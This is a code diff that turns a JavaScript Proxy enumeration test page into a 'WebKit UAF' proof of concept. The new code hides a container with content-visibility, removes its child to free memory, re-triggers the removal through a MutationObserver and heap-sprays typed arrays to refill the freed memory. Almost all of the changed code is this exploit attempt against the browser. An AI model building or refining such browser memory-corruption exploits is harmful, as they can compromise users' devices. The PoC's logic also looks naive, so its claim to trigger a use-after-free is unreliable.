@@ -1,85 +1,72 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Blind Leak Detection via Proxy</title>
+    <title>WebKit UAF - content-visibility PoC</title>
+    <style>
+        .container {
+            width: 200px;
+            height: 200px;
+        }
+        .child {
+            width: 100px;
+            height: 100px;
+            background-color: blue;
+        }
+    </style>
     <script>
         function log(msg) {
             document.body.innerHTML += msg + "<br>";
         }
 
         window.onload = () => {
-            log("Starting blind leak detection...");
+            log("Starting WebKit UAF PoC...");
 
-            const base = {};
+            const container = document.querySelector('.container');
+            const child = document.querySelector('.child');
 
-            let callCount = 0;
+            // MutationObserver to re-trigger UAF
+            const observer = new MutationObserver(() => {
+                log("Mutation observed, re-triggering...");
+                triggerUAF();
+            });
 
-            const handler = {
-                get(target, prop, receiver) {
-                    if (callCount++ > 5) {
-                        log("Breaking recursion after 5 calls");
-                        return undefined;
+            observer.observe(container, { childList: true });
+
+            function triggerUAF() {
+                try {
+                    // Step 1: Set content-visibility to hidden
+                    container.style.contentVisibility = 'hidden';
+
+                    // Step 2: Remove child (freeing memory)
+                    container.removeChild(child);
+
+                    // Step 3: Delay and restore visibility
+                    setTimeout(() => {
+                        container.style.contentVisibility = 'auto';
+                        log("Restored content-visibility");
+                    }, 100);
+
+                    // Step 4: Heap spray to fill freed memory
+                    window.spray = [];
+                    for (let i = 0; i < 10000; i++) {
+                        window.spray.push(new Uint8Array(0x100));
                     }
 
-                    log("Proxy 'get' called (" + callCount + ")");
-                    log("prop = " + prop);
-
-                    // Try to deeply inspect receiver
-                    try {
-                        log("Receiver = " + receiver);
-                        log("Receiver.constructor = " + receiver?.constructor?.name);
-
-                        // Try enumerating all keys
-                        const seen = new Set();
-                        const stack = [receiver];
-
-                        while (stack.length > 0) {
-                            const obj = stack.pop();
-                            try {
-                                for (let key of Reflect.ownKeys(obj)) {
-                                    if (!seen.has(key)) {
-                                        seen.add(key);
-                                        log(`Discovered key: ${key} (typeof: ${typeof key})`);
-                                        try {
-                                            const val = Reflect.get(obj, key, receiver);
-                                            log(`  value typeof: ${typeof val}`);
-                                        } catch (e) {
-                                            log(`  error reading value: ${e.message}`);
-                                        }
-                                        if (typeof obj === "object" && obj !== null) {
-                                            stack.push(Object.getPrototypeOf(obj));
-                                        }
-                                    }
-                                }
-                            } catch (e) {
-                                log("Error enumerating keys: " + e.message);
-                            }
-                        }
-                    } catch (e) {
-                        log("Error inspecting receiver: " + e.message);
-                    }
-
-                    return Reflect.get(...arguments);
+                    log("Heap spray complete.");
+                } catch (e) {
+                    log("Exception: " + e.message);
                 }
-            };
+            }
 
-            const proxy = new Proxy(base, handler);
-
-            (function () {
-                with (proxy) {
-                    try {
-                        log("Accessing 'toString'...");
-                        toString(); // Trigger Proxy trap
-                    } catch (e) {
-                        log("Exception in with-block: " + e.message);
-                    }
-                }
-            })();
+            // Start first trigger
+            triggerUAF();
         };
     </script>
 </head>
 <body>
-    <h2>Blind Leak Detection via Proxy Enumeration</h2>
-    <p>Trying to detect internal scope leaks via property enumeration.</p>
+    <h2>WebKit UAF via content-visibility</h2>
+    <div class="container">
+        <div class="child"></div>
+    </div>
 </body>
 </html>
